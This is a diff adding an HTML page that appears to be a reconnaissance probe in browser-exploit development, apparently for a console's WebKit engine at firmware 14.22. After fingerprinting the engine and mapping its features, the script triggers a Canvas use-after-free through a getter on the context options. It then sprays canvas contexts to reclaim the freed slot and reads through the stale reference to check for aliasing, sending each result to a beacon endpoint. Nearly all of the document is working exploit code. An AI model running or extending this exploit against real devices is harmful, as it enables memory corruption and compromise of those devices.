@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>v900 fw14.22 recon</title></head>
+<body>
+<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+// PROBE v900: 14.22 recon — engine fingerprint + capability map + Canvas UAF trigger
+// Goal: establish whether the 14.10 WebKit level survives on 14.22.
+// Order: fingerprint and capabilities FIRST (they survive a later crash),
+// then the Canvas UAF trigger, then the alias read (the likely crash point).
+
+function emit(tag, msg) {
+  var line = tag + ' ' + msg;
+  var el = document.getElementById('log');
+  if (el) el.textContent += line + '\n';
+  try { new Image().src = '/beacon?m=' + encodeURIComponent('[' + tag + '] ' + String(msg).slice(0, 400)); } catch (e) {}
+}
+
+emit('BOOT', 'v900 fw1422 recon');
+
+// A. Engine fingerprint
+emit('UA', navigator.userAgent);
+emit('PLAT', 'langs=' + navigator.languages + ' hwconc=' + (navigator.hardwareConcurrency || '?') +
+  ' mem=' + (navigator.deviceMemory || navigator.devicememory || '?'));
+
+// B. Capability map (compare against the 14.10 table in docs/WEBKIT_FINDINGS.md)
+var caps = {};
+try { caps.wasm = typeof WebAssembly !== 'undefined'; } catch (e) { caps.wasm = false; }
+try { caps.worker = typeof Worker !== 'undefined'; } catch (e) { caps.worker = false; }
+try { caps.fontface = typeof FontFace !== 'undefined'; } catch (e) { caps.fontface = false; }
+try { caps.bigint64 = typeof BigUint64Array !== 'undefined'; } catch (e) { caps.bigint64 = false; }
+try { caps.weakref = typeof WeakRef !== 'undefined'; } catch (e) { caps.weakref = false; }
+try { caps.finreg = typeof FinalizationRegistry !== 'undefined'; } catch (e) { caps.finreg = false; }
+try { caps.resizableab = typeof ArrayBuffer.prototype.resize === 'function'; } catch (e) { caps.resizableab = false; }
+try { caps.ataomics = typeof Atomics !== 'undefined' && typeof SharedArrayBuffer === 'undefined'; } catch (e) { caps.ataomics = false; }
+try { caps.sab = typeof SharedArrayBuffer !== 'undefined'; } catch (e) { caps.sab = false; }
+try { caps.webgl = !!document.createElement('canvas').getContext('webgl'); } catch (e) { caps.webgl = false; }
+try { caps.offscreencanvas = typeof OffscreenCanvas !== 'undefined'; } catch (e) { caps.offscreencanvas = false; }
+try { caps.localstorage = !!window.localStorage; } catch (e) { caps.localstorage = false; }
+try { caps.fetch = typeof fetch === 'function'; } catch (e) { caps.fetch = false; }
+try { caps.subtle = !!(window.crypto && window.crypto.subtle); } catch (e) { caps.subtle = false; }
+try { caps.structuredclone = typeof structuredClone === 'function'; } catch (e) { caps.structuredclone = false; }
+try { caps.mediasource = typeof MediaSource !== 'undefined'; } catch (e) { caps.mediasource = false; }
+var capStr = Object.keys(caps).filter(function (k) { return caps[k]; }).join(',');
+var missing = Object.keys(caps).filter(function (k) { return !caps[k]; }).join(',');
+emit('CAPS-ON', capStr);
+emit('CAPS-OFF', missing);
+
+// C. Canvas UAF trigger (upstream bitmaprenderer+alpha getter shape, 768B context)
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+document.body.appendChild(canvas);
+var innerCtx = null, fired = 0;
+var opts = {};
+Object.defineProperty(opts, 'alpha', {
+  get: function () {
+    fired++;
+    if (fired === 1) innerCtx = canvas.getContext('2d');
+    return true;
+  },
+  enumerable: true
+});
+var outerCtx = null;
+try { outerCtx = canvas.getContext('bitmaprenderer', opts); } catch (e) { emit('TRIG-ERR', e.name); }
+var uaf = (outerCtx && innerCtx && outerCtx !== innerCtx);
+emit(uaf ? 'A-OK' : 'A-NO', uaf ? 'stale!=live (UAF present on 14.22)' : 'trigger did not produce two contexts');
+
+// D. Same-type reclaim + alias read through stale (crash point — beacons BEFORE the read)
+if (uaf) {
+  var ctxs = [];
+  for (var i = 0; i < 500; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    document.body.appendChild(c);
+    var cx = c.getContext('2d');
+    if (cx) { cx.lineWidth = 800 + i; ctxs.push(cx); }
+  }
+  emit('SPRAY', 'n=' + ctxs.length + ' — reading stale.lineWidth next (crash here = slot not reclaimed)');
+  var lw = null;
+  try { lw = innerCtx.lineWidth; } catch (e) { lw = 'ERR:' + e.name; }
+  if (typeof lw === 'number') {
+    var idx = Math.round(lw - 800);
+    emit('ALIAS', 'lw=' + lw + ' idx=' + idx + ' in-range=' + (idx >= 0 && idx < ctxs.length));
+  } else {
+    emit('ALIAS', 'lw=' + lw);
+  }
+  emit('ALIVE', 'recon complete');
+} else {
+  emit('ALIVE', 'recon complete (no UAF to test)');
+}
+</script>
+</body>
+</html>
